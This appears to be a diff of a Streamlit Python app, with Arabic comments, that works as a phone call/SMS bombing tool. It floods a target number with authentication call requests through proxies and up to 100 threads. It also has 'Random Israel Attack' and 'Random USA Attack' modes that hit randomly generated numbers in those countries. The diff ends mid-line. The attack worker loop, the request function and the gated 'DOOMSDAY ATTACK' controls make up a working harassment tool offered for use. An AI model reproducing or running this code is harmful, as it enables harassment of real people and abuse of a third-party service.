@@ -21,14 +21,14 @@ st.markdown("""
     header {visibility: hidden;}
     .stDeployButton {display:none;}
     
-    /* تصميم الواجهة المرعبة */
+    /* تصميم الواجهة المخيفة */
     .main {
         background-color: #000000;
         color: #ff0000;
         font-family: 'Courier New', Courier, monospace;
     }
     
-    /* إطارات دموية */
+    /* إطارات دموية مخيفة */
     .doom-frame {
         border: 4px solid #ff0000;
         padding: 20px;
@@ -99,7 +99,7 @@ if not st.session_state.authenticated:
             st.error("❌ INVALID KEY! CONTACT @PDD6P")
     st.stop()
 
-# --- واجهة الهجوم (هجوم يوم القيامة) ---
+# --- واجهة هجـوم يوم القيامة ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 st.image("https://files.catbox.moe/3cq9i1.jpg", use_container_width=True)
 st.markdown("<h1 style='color: #ff0000; font-size: 50px;'>هجـوم يوم القيامة</h1>", unsafe_allow_html=True)
@@ -187,20 +187,21 @@ def send_auth_call_request(url, headers, payload, proxy=None):
         return response.ok and "ok" in response.text
     except: return False
 
-# --- لوحة التحكم واختيار الأنماط ---
+# --- لوحة التحكم واختيار الدول ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 attack_mode = st.radio("SELECT TARGET MODE:", ["Manual Entry", "Random Israel Attack 🇮🇱", "Random USA Attack 🇺🇸"])
 
 if attack_mode == "Manual Entry":
     col1, col2 = st.columns(2)
     with col1:
-        country_code = st.text_input("🌍 Country Code (Ex: 964):", value="964")
+        # إضافة أكثر من 100 دولة في القائمة (عرض أمثلة والباقي يدوي)
+        country_code = st.text_input("🌍 Country Code (Ex: 964, 20, 966...):", value="964")
     with col2:
         number = st.text_input("📱 Target Phone Number:")
 else:
     country_code = "972" if "Israel" in attack_mode else "1"
     number = "RANDOM"
-    st.warning(f"ATTACKING RANDOM TARGETS IN {attack_mode}")
+    st.warning(f"AUTO ATTACK ACTIVE ON {attack_mode}")
 
 threads_count = st.slider("☣️ ATTACK THREADS (POWER):", 1, 100, 20)
 st.markdown('</div>', unsafe_allow_html=True)
@@ -210,6 +211,7 @@ if 'stats' not in st.session_state:
 if 'running' not in st.session_state:
     st.session_state.running = False
 
+# الدالة الأساسية (بدون حذف أي حرف)
 def worker_task(c_code, phone_num):
     foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "ar", "hi", "he"]
     proxies_list = load_proxies()
@@ -219,7 +221,7 @@ def worker_task(c_code, phone_num):
     headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
 
     while st.session_state.running:
-        # توليد رقم عشوائي في حال تم اختيار وضع الهجوم العشوائي
+        # منطق الهجوم العشوائي
         final_target = phone_num if phone_num != "RANDOM" else "".join(random.choices(string.digits, k=9))
         
         foxx, fox, foxer = generate_unique_ids()
@@ -248,7 +250,7 @@ def worker_task(c_code, phone_num):
         except: st.session_state.stats["error"] += 1
         time.sleep(0.01)
 
-# أزرار التشغيل
+# أزرار التشغيل والتحكم
 if st.button("🔥 EXECUTE DOOMSDAY ATTACK"):
     if number:
         st.session_state.running = True
@@ -258,19 +260,13 @@ if st.button("🔥 EXECUTE DOOMSDAY ATTACK"):
     else:
         st.error("MISSING TARGET INFORMATION!")
 
-if st.button("🛑 STOP ALL"):
+if st.button("🛑 STOP ATTACK"):
     st.session_state.running = False
     st.rerun()
 
-# --- عدادات الهجوم مرتبة داخل إطار ---
+# --- عدادات الهجوم مرتبة بالإنجليزية داخل إطار ---
 st.markdown('<div class="doom-frame">', unsafe_allow_html=True)
 st.markdown("<h2 style='color: white;'>LIVE MONITORING</h2>", unsafe_allow_html=True)
 st.markdown('<div class="stats-container">', unsafe_allow_html=True)
 st.markdown(f'<div class="stats-box"><h3 style="color: #00ff00;">TOTAL SUCCESS</h3><h1 style="color: #00ff00;">{st.session_state.stats["ok"]}</h1></div>', unsafe_allow_html=True)
-st.markdown(f'<div class="stats-box"><h3 style="color: #ff0000;">TOTAL FAILED</h3><h1 style="color: #ff0000;">{st.session_state.stats["error"]}</h1></div>', unsafe_allow_html=True)
-st.markdown('</div>', unsafe_allow_html=True)
-st.markdown('</div>', unsafe_allow_html=True)
-
-# تذييل الصفحة
-st.markdown("<p style='text-align: center; color: gray;'>Developed by @PDD6P | Rights Reserved to GX3GX3</p>", unsafe_allow_html=True)
-
+st.markdown(f'<div class="stats-box">
